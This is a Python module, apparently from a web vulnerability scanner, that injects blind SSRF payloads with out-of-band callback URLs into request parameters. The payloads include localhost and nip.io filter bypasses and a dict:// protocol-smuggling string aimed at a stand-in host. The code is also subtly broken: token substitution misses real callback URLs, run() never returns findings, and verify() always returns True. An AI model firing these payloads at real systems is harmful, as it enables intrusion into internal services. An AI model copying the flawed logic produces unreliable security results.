from .base import AttackModule, register_module, Endpoint, Parameter, ParameterProfile, Finding

@register_module
class SSRFModule(AttackModule):
    module_id = "ssrf_blind"
    vuln_class = "SSRF"
    severity = "HIGH"
    requires_oob = True

    @property
    def payloads(self):
        # We need an actual OOB server up to test this properly.
        # It injects the callback URL into the parameter.
        oob_url = self.oob.get_callback_url() if self.oob else "http://example-oob.com"
        return [
            f"{oob_url}",
            f"http://{oob_url}",
            f"https://{oob_url}",
            f"http://127.0.0.1.nip.io@{oob_url}",
            f"http://localhost@{oob_url}",
            f"dict://{oob_url}:8080/info", # Protocol smuggling attempt
        ]

    async def run(self, endpoint: Endpoint, param: Parameter, profile: ParameterProfile) -> list[Finding]:
        findings = []

        if not self.oob:
            return findings # Cannot test blind SSRF without Out-of-Band capability

        for payload in self.payloads:
            try:
                # Log that we are sending a payload expected to trigger an OOB hit
                token = self.oob.register_expected_hit(
                    module_id=self.module_id, 
                    target=endpoint.url, 
                    param=param.name
                )
                
                # Make payload specific to generated token
                tokenized_payload = payload.replace("example-oob.com", f"{token}.example-oob.com")

                response = await self.http.inject(
                    endpoint=endpoint,
                    param=param,
                    payload=tokenized_payload,
                    timeout=5,
                )
                
                # For SSRF, we don't necessarily get immediate feedback in response
                # We defer to the OOB callback receiver which processes asynchronously
                
            except Exception as e:
                # Timeouts might actually indicate successful SSRF if the target hung waiting on OOB
                pass
                
        return findings

    async def verify(self, finding: Finding) -> bool:
        return True
